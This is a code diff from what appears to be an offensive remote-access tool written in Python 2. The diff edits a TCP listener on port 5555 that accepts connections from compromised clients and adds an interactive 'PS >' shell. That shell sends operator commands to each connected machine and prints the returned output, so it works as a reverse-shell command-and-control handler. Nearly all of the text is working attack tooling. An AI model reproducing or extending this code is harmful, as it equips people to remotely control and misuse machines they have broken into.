@@ -16,23 +16,46 @@ def startListener():
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.bind((FUNCTIONS().CheckInternet(), 5555))
         s.listen(1)
+        print t.bold_red + "listening on port 5555" + t.normal
 
-        with t.location(y=1):
-            print t.bold_red + "listening on port 5555" + t.normal
         clientnumber = 0
         while True:
             clientconn, address = s.accept()
             ip , port = address
             if clientconn:
                 clientnumber += 1
-                with t.location(y=1):
-                    print t.bold_green + "connection from %s %s"%(ip,port) + t.normal
+                print t.bold_green + "connection from %s %s"%(ip,port) + t.normal
+
             from menu import clientMenuOptions
-            clientMenuOptions[clientnumber] =  {'payloadchoice': None, 'payload':ip + ":" + str(port), 'extrawork': None}
+            clientMenuOptions[str(clientnumber)] =  {'payloadchoice': None, 'payload':ip + ":" + str(port), 'extrawork': interactShell, 'params': (clientconn,clientnumber)}
         s.close()
-    except:
-        with t.location(y=1):
-            print t.bold_red + "Couldn't start Listener on port 5555" + t.normal
+    except Exception as E:
+        print t.bold_red + "Error With Listener" + t.normal
+        print E
+
+def interactShell(clientconn,clientnumber):
+    from menu import clientMenuOptions
+    while True:
+        data = ''
+        command = raw_input("PS >")
+        if command == "exit":
+            break
+        if command == "kill":
+            print t.bold_red + "Client Connection Killed" + t.normal
+            del clientMenuOptions[str(clientnumber)]
+            clientconn.close()
+            break
+        if command == "":
+            continue
+        clientconn.sendall(command)
+        a = True
+        while a:
+            data += clientconn.recv(16834).encode("utf-8").replace('\n','')
+            if data[-1] == "\x00":
+                a = False
+        print data
+    return True
+
 
 """
 def startSocket(ipaddr, port):
